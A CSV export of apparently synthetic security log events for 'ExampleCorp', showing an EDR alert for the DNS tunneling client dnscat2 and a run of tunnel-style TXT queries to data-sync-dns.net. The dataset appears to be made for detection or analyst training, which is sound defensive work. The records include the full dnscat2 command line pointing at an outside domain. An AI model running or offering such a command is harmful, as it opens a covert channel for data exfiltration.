@timestamp,event.dataset,event.action,host.name,host.ip,user.name,source.ip,destination.ip,destination.port,url.full,process.name,process.command_line,file.path,file.hash.sha256,email.subject,raw,json
2024-12-02T01:40:10Z,endpoint,process_start,WKSTN-031,10.10.31.19,bchan,,,,,dnscat2-client.exe,dnscat2-client.exe --dns data-sync-dns.net,,,,EDR: known DNS tunneling client executed,"{""@timestamp"": ""2024-12-02T01:40:10Z"", ""event"": {""dataset"": ""endpoint"", ""action"": ""process_start"", ""kind"": ""event"", ""category"": [""process""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""EDR: known DNS tunneling client executed"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""process"": {""name"": ""dnscat2-client.exe"", ""pid"": 8800, ""parent"": {""name"": ""cmd.exe"", ""pid"": 2210}, ""command_line"": ""dnscat2-client.exe --dns data-sync-dns.net""}}"
2024-12-02T01:40:20Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: first_seen tunneling domain,"{""@timestamp"": ""2024-12-02T01:40:20Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: first_seen tunneling domain"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""init.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:40:40Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=00aaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:40:40Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=00aaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""00aaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:40:46Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=01aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:40:46Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=01aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""01aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:40:52Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=02aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:40:52Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=02aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""02aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:40:58Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=03aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:40:58Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=03aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""03aaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:41:04Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=04aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:41:04Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=04aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""04aaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:41:10Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=05aaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:41:10Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=05aaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""05aaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:41:16Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=06aaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:41:16Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=06aaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""06aaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
2024-12-02T01:41:22Z,network,dns,WKSTN-031,10.10.31.19,bchan,10.10.31.19,,,,,,,,,DNS: query=07aaaaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel),"{""@timestamp"": ""2024-12-02T01:41:22Z"", ""event"": {""dataset"": ""network"", ""action"": ""dns"", ""kind"": ""event"", ""category"": [""network""]}, ""organization"": {""name"": ""ExampleCorp""}, ""tags"": [], ""event.original"": ""DNS: query=07aaaaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net type=TXT answer=- (tunnel)"", ""host"": {""name"": ""WKSTN-031"", ""ip"": [""10.10.31.19""]}, ""user"": {""name"": ""bchan"", ""email"": null}, ""source"": {""ip"": ""10.10.31.19""}, ""dns"": {""question"": {""name"": ""07aaaaaaaaaaaaaaaaaaaaaaaaaaaa.data-sync-dns.net""}, ""answers"": [{""data"": ""162.55.88.19"", ""ttl"": 30}]}}"
